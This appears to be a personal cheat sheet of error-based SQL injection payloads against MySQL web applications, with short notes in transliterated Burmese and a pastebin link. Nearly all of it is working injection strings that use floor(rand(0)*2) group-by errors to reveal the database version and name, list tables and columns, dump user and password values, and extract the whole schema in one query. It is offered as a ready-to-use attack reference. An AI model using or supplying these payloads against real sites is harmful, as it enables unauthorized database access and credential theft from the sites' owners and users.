https://pastebin.com/V6pwM7KF   => ko root note

Error Base Double query use

a. The Used Select Statements Have Different Number Of Columns.

b. Unknown Column 1 or no columns at all (in webpage and page source)

c. Error #1604



Show Version
or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1

Show Database 
or 1 group by concat_ws(0x3a,database(),floor(rand(0)*2)) having min(0) or 1 


Show Database   -> nout a pone san   (or twe and twe bal play phot lo dal)

and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)


Show tables

and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  -> 0,1 ka first table ko kyi mal pyaw dar

Show tables

and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)   -> second table ko kyi mar

Show columns    -> tablename change oak naw

and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0xTable and table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

Dump data by edit

and (select 1 from (select count(*),concat((select(select concat(cast(concat(user,0x7e,password)as char),0x7e)) from information_schema.columns where table_name=0xTable and table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

Dump data from columns -> ko root

and (select 1 from (select count(*),concat((select(select concat(cast(concat(COLUMN_NAME,0x7e,COLUMN_NAME) as char),0x7e)) from Databasename.TABLENAME limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)




Dump in one Shot ( Database,Table,Column )

(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.columns) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=/*!50000concat*/(@x,0x3c62723e,table_schema,0x272d2d3e27,table_name,0x272d2d3e27,column_name))))x)